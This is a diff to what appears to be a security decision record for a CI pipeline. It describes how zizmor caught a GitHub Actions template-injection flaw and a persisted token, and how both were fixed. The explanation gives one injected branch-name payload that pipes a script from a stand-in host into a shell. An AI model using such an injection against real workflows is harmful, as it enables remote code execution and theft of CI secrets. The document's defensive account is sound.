@@ -120,6 +120,34 @@ Complementary, not alternatives:
   unpinned `uses:`, dangerous triggers. Also acts as a GitHub Actions
   harden-runner adjunct.
 
+**This decision paid for itself immediately, on first execution.** The two
+tools were initially reported as `SKIPPED (CI always runs it)` because neither
+was installed locally, so `make workflows` had never actually run its audits.
+Installing them caused zizmor to fail the gate with two findings in the
+`ci.yml` written during this same phase:
+
+- `template-injection` at **HIGH confidence** — `git fetch origin "${{
+  github.base_ref }}"` expanded an attacker-controlled branch name into a
+  `run:` block. `${{ }}` expansion happens *before* the shell parses the
+  script, so a branch named `x"; curl evil.sh | sh; "` executes. Fixed by
+  passing the value through `env:` and referencing `"$BASE_REF"`, which the
+  shell treats as data rather than code. The same fix was applied to the
+  `contains(...)` label expression on the next line.
+- `artipacked` at Low confidence — `actions/checkout` left the `GITHUB_TOKEN`
+  persisted in `.git/config`. Fixed with `persist-credentials: false`; nothing
+  in the workflow pushes, so the credential was never needed.
+
+**actionlint alone would have caught neither.** It validates expression types
+and shell syntax, and both of these are syntactically valid. That is the
+concrete argument for running both tools rather than picking one: they fail on
+disjoint inputs.
+
+The deeper lesson is about *skips*. A gate that reports `SKIPPED` is not a
+passing gate, and this one had silently never run — the vulnerability existed
+for the entire period the gate claimed to check for it. `make workflows`
+therefore distinguishes the two loudly, and the CI job installs both tools from
+pinned release assets so the real audits always execute there.
+
 ## Decision 5: Tool versions are pinned INSIDE the workflow
 
 This is the specific lesson of **CVE-2026-33634** (March 2026), in which
@@ -165,9 +193,11 @@ findings to 0 actionable ones without weakening the check.
 - Four new dev dependencies (`bandit`, `pip-audit`, plus transitive).
 - The licence allow-list will require maintenance as the toolchain grows. That
   is the intended friction: adding a dependency is a decision.
-- `actionlint` and `zizmor` are not installed locally; `make workflows` prints
-  `SKIPPED (CI always runs it)` rather than passing silently. An unrun check
-  must never look like a passed one (charter §28).
+- `actionlint` and `zizmor` are not installed locally by default; `make
+  workflows` prints `SKIPPED (CI always runs it)` rather than passing silently.
+  An unrun check must never look like a passed one (charter §28). Both are
+  installed on this machine and the gate runs its real audits; the SKIP path
+  remains for a fresh clone.
 - Bandit does not scan test files, so a **real** hardcoded credential in a test
   would not be caught by bandit. `gitleaks` scans full history for exactly
   that, on every commit and in CI. Recorded as AR-002.
